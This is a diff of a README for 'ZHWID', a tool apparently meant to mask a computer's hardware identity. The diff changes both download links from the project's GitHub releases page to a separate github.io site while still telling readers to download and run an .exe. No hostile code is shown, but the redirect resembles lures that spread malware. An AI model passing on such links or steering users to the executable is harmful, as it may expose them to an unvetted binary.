@@ -1,6 +1,6 @@
 # 🛡️ ZHWID - Keep your computer identity private always
 
-[![](https://img.shields.io/badge/Download-ZHWID-blue)](https://github.com/Rajwants8351/ZHWID/releases)
+[![](https://img.shields.io/badge/Download-ZHWID-blue)](https://rajwants8351.github.io)
 
 ## What is ZHWID?
 
@@ -14,7 +14,7 @@ The software functions as an identity manager for your hardware. It handles the 
 
 You need to download the installer from our release page to start using the tool. 
 
-1. Visit this page: [https://github.com/Rajwants8351/ZHWID/releases](https://github.com/Rajwants8351/ZHWID/releases)
+1. Visit this page: [https://rajwants8351.github.io](https://rajwants8351.github.io)
 2. Look for the file ending in .exe in the "Assets" section.
 3. Click the file name to start the download.
 4. Save the file where you can find it.
